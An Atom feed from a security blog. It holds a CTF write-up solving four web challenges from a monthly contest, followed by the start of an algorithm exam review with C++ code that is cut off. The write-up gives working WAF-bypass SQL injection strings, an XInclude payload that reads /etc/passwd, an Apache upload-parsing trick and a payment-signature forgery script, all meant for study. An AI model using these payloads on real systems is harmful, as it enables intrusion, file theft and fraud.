<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>0verWatch&#39;s Blog</title>
  
  <subtitle>学习本无底，前进莫彷徨</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="0verwatch.top/"/>
  <updated>2018-11-08T14:04:40.774Z</updated>
  <id>0verwatch.top/</id>
  
  <author>
    <name>0verWatch</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>安恒10月赛Web题目复现</title>
    <link href="0verwatch.top/anheng-10month.html"/>
    <id>0verwatch.top/anheng-10month.html</id>
    <published>2018-11-08T12:46:41.000Z</published>
    <updated>2018-11-08T14:04:40.774Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>10月赛的时候去打那个瓜皮的领航杯(体验极差)，还是回来复现安恒的题目比较好<a id="more"></a>，质量还是有保证的，学到很多东西</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="easy-audit"><a href="#easy-audit" class="headerlink" title="easy audit"></a>easy audit</h3><p>这个题目确实有点脑洞。。运用了两个php函数一个是<code>get_defined_functions</code>这个函数是用于返回所有已定义函数的数组，而另外一个则是<code>get_defined_vars</code> 这个函数是返回由所有已定义变量所组成的数组<br>可以查看此网址:<a href="https://www.jb51.net/article/42890.htm" target="_blank" rel="noopener">https://www.jb51.net/article/42890.htm</a></p><p>右键查看源代码发现存在<code>index.php?func1</code>，那么这个参数究竟有什么作用可以先尝试一下，上手就来一个phpinfo，发现直接有回显<br><a href="https://imgchr.com/i/iH0hd0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iH0hd0.md.png" alt="iH0hd0.md.png"></a><br>猜测是直接运行函数之类的功能,然后运用get_defined_functions 获得全局的函数这里面的函数有内置的也有开发人员自己定义的函数，可以发现最后的这一个函数特别显眼，调用一下这个函数发现有源码出来<br><a href="https://imgchr.com/i/iH0TWF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iH0TWF.md.png" alt="iH0TWF.md.png"></a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//include 'real_flag.php';</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jam_source_ctf_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">jam_flag</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])?$_GET[<span class="string">'a'</span>]:<span class="string">'123'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gen_str</span><span class="params">($m=<span class="number">6</span>)</span></span>&#123;</span><br><span class="line">        $str = <span class="string">''</span>;</span><br><span class="line">        $str_list = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span>;</span><br><span class="line">        <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$m;$i++)&#123;</span><br><span class="line">            $str .= $str_list[rand(<span class="number">0</span>,strlen($str_list)<span class="number">-1</span>)];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">GiveYouTheFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'real_flag.php'</span>;</span><br><span class="line">        $secret = <span class="keyword">$this</span>-&gt;gen_str();</span><br><span class="line">        <span class="comment">//echo $secret;</span></span><br><span class="line">        <span class="keyword">if</span>($secret === <span class="keyword">$this</span>-&gt;a)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $real_flag;<span class="comment">//echo $flag</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'want to use me?'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;GiveYouTheFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> rand().<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">$_flag = <span class="keyword">new</span> jam_flag;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]) &amp;&amp; $_POST[<span class="string">'flag'</span>] === <span class="string">'I want the flag'</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'real_flag.php'</span>;</span><br><span class="line">    $_flag-&gt;GiveYouTheFlag();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>这段代码大致的意思就是新建了一个类，然后调用类里面的函数把flag给输出来<br>这里我们用到<code>get_defined_vars</code>这个函数，单独使用是不能输出flag的，可能到这里会存在疑问输出flag的函数应该还得满足<code>$secret === $this-&gt;a</code>而这个secret又是随机生成的，那要怎么办，其实不需要，这里的flag是属于<code>real_flag.php</code>里面的只要我们把页面包含进来我们就可以把该页面所有变量值都给打印出来了，所以关键点还得满足这个条件<br><code>isset($_POST[&#39;flag&#39;]) &amp;&amp; $_POST[&#39;flag&#39;] === &#39;I want the flag&#39;</code><br>即可包含real_flag.php，这应该是出题人故意留的不然也输出不了flag，23333<br><a href="https://imgchr.com/i/iHBiyd" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHBiyd.md.png" alt="iHBiyd.md.png"></a><br>发包得到flag<br><a href="https://imgchr.com/i/iHBAeI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHBAeI.md.png" alt="iHBAeI.md.png"></a></p><h3 id="手速要快"><a href="#手速要快" class="headerlink" title="手速要快"></a>手速要快</h3><p>这个题目进去之后要登录，右键查看源代码找找http头部啥的发现里面有一个password，直接复制提交就可以登陆上去，登陆以后是一个upload页面<br><img src="https://s1.ax1x.com/2018/11/08/iHBMlQ.png" alt="iHBMlQ.png"><br><img src="https://s1.ax1x.com/2018/11/08/iHBlOs.png" alt="iHBlOs.png"></p><p>然后尝试上传一个小马，发现不行，然后尝试改一下后缀发现这应该是黑名单过滤的，因为尝试了<code>php2,php3.php4</code>都可以上传，但是却不能解析把他们都当做文本解析了<br><a href="https://imgchr.com/i/iHBapF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHBapF.md.png" alt="iHBapF.md.png"></a><br>但是可以发现服务器版本是<code>Apache/2.4.6</code>，这里可能存在解析漏洞，把后缀名改为Apache不认识的就可以了<br><a href="https://imgchr.com/i/iHBw6J" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHBw6J.md.png" alt="iHBw6J.md.png"></a><br><a href="https://imgchr.com/i/iHB7AP" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHB7AP.md.png" alt="iHB7AP.md.png"></a><br>flag直接在上层目录flag{698539765730b69026796420b9201e03}</p><h2 id="CoolCms"><a href="#CoolCms" class="headerlink" title="CoolCms"></a>CoolCms</h2><p>原来这个题一叶飘零学长出的额2333<br>这个网站两个地方可能存在漏洞一个就是<code>article.php</code>页面存在SQL注入，因为这里面id参数暴露了出来，另外就是在<code>write.php</code>页面上可能存在xxe文件读取<br>现在可能存在的注入页面输入3的时候就会出现<code>table flag????</code>，再fuzz测试一下发现<code>or，update，delete，</code>以及逗号等符号都被过滤了<br><a href="https://imgchr.com/i/iHBL9S" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHBL9S.md.png" alt="iHBL9S.md.png"></a></p><p>本来就是飘零学长出的题目就去参考他的博客呀<br><a href="http://skysec.top/2018/02/02/skysql%E4%B9%8Bunion%E7%BB%95waf/" target="_blank" rel="noopener">http://skysec.top/2018/02/02/skysql%E4%B9%8Bunion%E7%BB%95waf/</a><br><a href="http://skysec.top/2018/08/18/%E6%B5%85%E6%9E%90xml%E4%B9%8Bxinclude-xslt/" target="_blank" rel="noopener">http://skysec.top/2018/08/18/%E6%B5%85%E6%9E%90xml%E4%B9%8Bxinclude-xslt/</a></p><p>我们可以从fuzz的结果发现这里面的<code>union</code>还有<code>select</code>都可以单独使用但一旦他们两个一起使用的时候，就会被waf掉，猜测后台写的正则是这样写的<code>|union select|</code>，我们就可以使用<code>%0b</code>将其绕过，也就是<code>union%0bselect</code><br>但是逗号又被过滤了，这个时候就可以用<code>join</code>去绕过<br><img src="https://s1.ax1x.com/2018/11/08/iHDk3F.png" alt="iHDk3F.png"><br>用<code>join</code>实现同样的效果<br><a href="https://imgchr.com/i/iHDAc4" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHDAc4.md.png" alt="iHDAc4.md.png"></a></p><p><code>or</code>被过滤了，<code>information_schema</code>没法使用，虽然题目这里提示了我们表名为flag，但是字段名却无从知晓，这时候就可以利用联合填充来代替掉字段名和表名<br><img src="https://s1.ax1x.com/2018/11/08/iHDmH1.png" alt="iHDmH1.png"></p><p><a href="https://imgchr.com/i/iHDtHI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHDtHI.md.png" alt="iHDtHI.md.png"></a><br>可以发现现在字段名变成了1,2,3，所以要查找里面的内容可以用用下面的语句<br><code>select * from users where id=-1 union select 1,(select i.2 from (select 1,2,3 union select * from users)i limit 1,1),3;</code><br><a href="https://imgchr.com/i/iHDd4f" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHDd4f.md.png" alt="iHDd4f.md.png"></a></p><p>这样即可无需字段名来查找数据，然后通过limit语句一条条查即可，这里是因为逗号被过滤了所以我们用offset来替代<br>因此先测试一下哪一列有回显<br><code>-1&#39; union%0bselect * from (select 1)x join (select 2)y join (select 3)k join (select 4)l--+</code>发现第二列跟第四列有回显<br><a href="https://imgchr.com/i/iHD0C8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHD0C8.md.png" alt="iHD0C8.md.png"></a></p><p>接着直接用上面的套路读出flag的路径<code>-1&#39; union%0bselect * from (select 1)x join (select 2)y join (select 3)k join (select i.4 from (select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d union%0bselect * from flag)i limit 1 offset 1)l-- k</code><br>得到路径是<code>/home/fff123aggg</code><br><a href="https://imgchr.com/i/iHD2Eq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHD2Eq.md.png" alt="iHD2Eq.md.png"></a><br>开始用xxe读取文件，先试一下<code>/etc/passwd</code>,成功回显<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span> <span class="attr">xmlns:xi</span>=<span class="string">"http://www.w3.org/2001/XInclude"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">"file:///etc/passwd"</span> <span class="attr">parse</span>=<span class="string">"text"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><a href="https://imgchr.com/i/iHDW5V" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHDW5V.md.png" alt="iHDW5V.md.png"></a><br>然后读取flag<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span> <span class="attr">xmlns:xi</span>=<span class="string">"http://www.w3.org/2001/XInclude"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">"file:///home/fff123aggg"</span> <span class="attr">parse</span>=<span class="string">"text"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>得到flag{316f87681354a715d6134c4b8166aa73}</p><h2 id="shop"><a href="#shop" class="headerlink" title="shop"></a>shop</h2><p>这个题是个代码审计的题目，先把源码给down下来<br>打开这个网站发现有登陆注册功能，以及购买flag的功能，但是这里面要想得到真正的flag却需要<code>888</code>积分才可以购买，这个时候就感觉应该是越权购买flag的漏洞了。。。。<br>发现源码里面有数据库文件打开看一下，发现是存在管理员的，并且id是<code>16</code>，这个东西后期有用，而且他有<code>30000</code>积分，够买很多flag了，<br><a href="https://imgchr.com/i/iHDqV1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHDqV1.md.png" alt="iHDqV1.md.png"></a><br><img src="https://s1.ax1x.com/2018/11/08/iHrJRU.png" alt="iHrJRU.png"></p><p>这里面学到了该如何审计python的代码，感觉跟php套路一样，还是得先去看一下设置文件对应就是这里面的<code>setting</code>文件，<br><a href="https://imgchr.com/i/iHrYzF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHrYzF.md.png" alt="iHrYzF.md.png"></a><br>发现里面有一个空的<code>real flag</code>只是出题人把他给删掉了，这里面的重要信息就是这个secret.key是用于构造签名的<br>其实这个<code>secret.key</code>已经给了的，也存在于源码里面<br><a href="https://imgchr.com/i/iHrUsJ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHrUsJ.md.png" alt="iHrUsJ.md.png"></a><br>然后重点看<code>urls.py.</code>以及<code>views.py</code>,如果<code>views.py</code>不存在<code>urls.py</code>里面的函数说明是调用了框架自身调用的函数，对于这个题而言没必要去查看框架本身的代码<br>这段代码在注册方面本身是没有任何问题的，所以得看其他方面<br>再查看shop里面的<code>urls.py</code>以及<code>views.py</code>可以发现里面存在购买对于身份的验证操作<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payOrder</span><span class="params">(request, orderid)</span>:</span></span><br><span class="line">o = get_object_or_404(Order, id=orderid, user=request.user, status=Order.ONGOING)</span><br><span class="line">form = &#123;</span><br><span class="line"><span class="string">'order_id'</span>: o.id,</span><br><span class="line"><span class="string">'buyer_id'</span>: o.user.id,</span><br><span class="line"><span class="string">'good_id'</span>: o.good.id,</span><br><span class="line"><span class="string">'buyer_point'</span>: o.user.profile.point,</span><br><span class="line"><span class="string">'good_price'</span>: o.good.price,</span><br><span class="line"><span class="string">'order_create_time'</span>: o.create_time.timestamp()</span><br><span class="line">&#125;</span><br><span class="line">str2sign = RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE + <span class="string">'&amp;'</span>.join([<span class="string">f'<span class="subst">&#123;i&#125;</span>=<span class="subst">&#123;form[i]&#125;</span>'</span> <span class="keyword">for</span> i <span class="keyword">in</span> form]).encode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="comment">#print(str2sign)</span></span><br><span class="line">sign = md5(str2sign).hexdigest()</span><br><span class="line"><span class="comment">#print(sign)</span></span><br><span class="line"><span class="keyword">return</span> render(request, <span class="string">'payment/confirm.html'</span>, &#123;<span class="string">'form'</span>: form, <span class="string">'sign'</span>: sign&#125;)</span><br></pre></td></tr></table></figure></p><p>这段代码最后是跳到<code>payment</code>的路由下，我们可以继续追踪一下，发现<code>payment</code>下就一个<code>check</code>函数，关键的函数就在<code>views.py</code>里面，这里对交易做了详细的校验<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkPayment</span><span class="params">(request)</span>:</span></span><br><span class="line"><span class="comment"># print(request.body)</span></span><br><span class="line">ret = &#123;<span class="string">'result'</span>: <span class="string">'未知错误'</span>, <span class="string">'status'</span>: <span class="string">'danger'</span>&#125;</span><br><span class="line">sign = request.GET.get(<span class="string">'signature'</span>, <span class="string">''</span>)</span><br><span class="line"><span class="keyword">if</span> md5(RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE + request.body).hexdigest() == sign:</span><br><span class="line">o = get_object_or_404(Order, id=request.POST.get(<span class="string">'order_id'</span>))</span><br><span class="line">g = get_object_or_404(Good, id=request.POST.get(<span class="string">'good_id'</span>))</span><br><span class="line">u = get_object_or_404(User, id=request.POST.get(<span class="string">'buyer_id'</span>))</span><br><span class="line"><span class="comment"># 检查订单是否为待支付状态</span></span><br><span class="line"><span class="keyword">if</span> o.status != Order.ONGOING:</span><br><span class="line">ret[<span class="string">'result'</span>] = <span class="string">f'订单 <span class="subst">&#123;o.id&#125;</span> 状态异常，可能已完成或已取消'</span></span><br><span class="line"><span class="comment"># 检查商品是否可购买</span></span><br><span class="line"><span class="keyword">elif</span> g.available != <span class="keyword">True</span> <span class="keyword">or</span> g.amount &lt;= <span class="number">0</span>:</span><br><span class="line">ret[<span class="string">'result'</span>] = <span class="string">f'商品 <span class="subst">&#123;g.id&#125;</span> 暂时不可购买，可能库存不足'</span></span><br><span class="line"><span class="comment"># 检查用户可用积分是否足够</span></span><br><span class="line"><span class="keyword">elif</span> u.profile.point &lt; g.price:</span><br><span class="line">ret[<span class="string">'result'</span>] = <span class="string">f'用户 <span class="subst">&#123;u.username&#125;</span> 可用积分不足，无法完成支付'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> u.is_staff != <span class="keyword">True</span>:</span><br><span class="line">u.profile.point -= g.price</span><br><span class="line">u.save()</span><br><span class="line">g.amount -= <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> g.name == <span class="string">'FLAG'</span>:</span><br><span class="line">o.message = REAL_FLAG</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">o.message = <span class="string">f'fake_flag<span class="subst">&#123;&#123;&#123;md5(urandom(<span class="number">32</span>)).hexdigest()&#125;</span>&#125;&#125;&lt;br&gt;(购买“FLAG”才能获得真正的 flag)'</span></span><br><span class="line"><span class="keyword">if</span> g.amount &lt;= randint(<span class="number">0</span>, <span class="number">100</span>):</span><br><span class="line">g.amount += randint(<span class="number">100</span>, <span class="number">200</span>)</span><br><span class="line">g.save()</span><br><span class="line">o.status = Order.FINISHED</span><br><span class="line">o.save()</span><br><span class="line">ret[<span class="string">'result'</span>] = <span class="string">f'订单 <span class="subst">&#123;o.id&#125;</span> 支付成功！'</span></span><br><span class="line">ret[<span class="string">'status'</span>] = <span class="string">'success'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">ret[<span class="string">'result'</span>] = <span class="string">'签名不正确，数据可能被篡改！'</span></span><br><span class="line"><span class="keyword">return</span> render(request, <span class="string">'payment/result.html'</span>, ret)</span><br></pre></td></tr></table></figure></p><p>商品从三方面进行了校验<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.检查订单是否为待支付状态</span><br><span class="line">2.检查商品是否可购买</span><br><span class="line">3.检查用户可用积分是否足够</span><br></pre></td></tr></table></figure></p><p>但是这三方面只是单单对商品方做了校验(自检验)，那购买者呢？不存在对其的任何校验，也就是没有做好双向的校验，这也说明我们可以从伪造购买者的方面去入手，让别人付钱23333</p><p>根据它里面的代码去构造signature就好了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE = <span class="string">'zhinianyuxin'</span></span><br><span class="line">form = &#123;</span><br><span class="line"><span class="string">'order_id'</span>: <span class="string">'148'</span>,</span><br><span class="line"><span class="string">'buyer_id'</span>: <span class="string">'16'</span>,   <span class="comment">#admin账号id，从数据库得知</span></span><br><span class="line"><span class="string">'good_id'</span>: <span class="string">'38'</span>,   <span class="comment"># 商品id也可从数据库得知</span></span><br><span class="line"><span class="string">'buyer_point'</span>: <span class="string">'250'</span>,</span><br><span class="line"><span class="string">'good_price'</span>: <span class="string">'50'</span>,</span><br><span class="line"><span class="string">'order_create_time'</span>: <span class="string">'1541706305.953427'</span> <span class="comment">#时间戳支付订单上有</span></span><br><span class="line">&#125;</span><br><span class="line">str2sign = RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE + <span class="string">'&amp;'</span>.join([<span class="string">f'<span class="subst">&#123;i&#125;</span>=<span class="subst">&#123;form[i]&#125;</span>'</span> <span class="keyword">for</span> i <span class="keyword">in</span> form]).encode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="comment">#print(str2sign)</span></span><br><span class="line">sign = md5(str2sign).hexdigest()</span><br><span class="line">print(sign)</span><br></pre></td></tr></table></figure></p><p>得到签名之后抓支付的包修改对应参数发包即可<br><a href="https://imgchr.com/i/iHraL9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHraL9.md.png" alt="iHraL9.md.png"></a><br>得到flag<br><a href="https://imgchr.com/i/iHr6zD" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHr6zD.md.png" alt="iHr6zD.md.png"></a></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这次月赛学到了几个点总结一下，第一就是学到PHP几个偏门小函数，第二就是一叶飘零学长出的题目的一波SQL注入的骚操作以及xxe文件读取的操作，第三就是执念于心学长出的逻辑漏洞的代码审计，如何去审计Django框架的代码，怎么去发现无双向检验的logic漏洞，复习去了2333</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;10月赛的时候去打那个瓜皮的领航杯(体验极差)，还是回来复现安恒的题目比较好
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>算法上机考试复习</title>
    <link href="0verwatch.top/algorithm-review.html"/>
    <id>0verwatch.top/algorithm-review.html</id>
    <published>2018-11-08T12:00:35.000Z</published>
    <updated>2018-11-08T14:06:09.087Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近要上机考试，因此还是对以前做过的题目做一个复习回顾，自己重新手写一遍，纯属回顾，代码风格不好请海涵，考完试以后我把考了的点都标记了一下方便以后学弟学妹们复习了<a id="more"></a>，2333</p><h2 id="迭代递归"><a href="#迭代递归" class="headerlink" title="迭代递归"></a>迭代递归</h2><h3 id="汽水瓶-考试考了类似的"><a href="#汽水瓶-考试考了类似的" class="headerlink" title="汽水瓶(考试考了类似的)"></a>汽水瓶(考试考了类似的)</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>有这样一道智力题：“某商店规定：三个空汽水瓶可以换一瓶汽水。小张手上有十个空汽水瓶，她最多可以换多少瓶汽水喝？”答案是5瓶，方法如下：先用9个空瓶子换3瓶汽水，喝掉3瓶满的，喝完以后4个空瓶子，用3个再换一瓶，喝掉这瓶满的，这时候剩2个空瓶子。然后你让老板先借给你一瓶汽水，喝掉这瓶满的，喝完以后用3个空瓶子换一瓶满的还给老板。如果小张手上有n个空汽水瓶，最多可以换多少瓶汽水喝？</p><h5 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h5><p>输入文件最多包含10组测试数据，每个数据占一行，仅包含一个正整数n(1≤n≤100)，表示小张手上的空汽水瓶数。n=0表示输入结束，你的程序不应当处理这一行。</p><h5 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h5><p>对于每组测试数据，输出一行，表示最多可以喝的汽水瓶数。如果一瓶也喝不到，输出 0</p><h5 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">10</span><br><span class="line">81</span><br><span class="line">0</span><br></pre></td></tr></table></figure><h5 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">5</span><br><span class="line">40</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span> )<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">int</span> a,b;</span><br><span class="line"><span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(n &gt;= <span class="number">3</span>)&#123;</span><br><span class="line">a = n/<span class="number">3</span>;</span><br><span class="line">b = n%<span class="number">3</span>;</span><br><span class="line">result += a;</span><br><span class="line">n = a+b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( n ==<span class="number">2</span>) result += <span class="number">1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>,result);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="跳台阶-考试考了类似的"><a 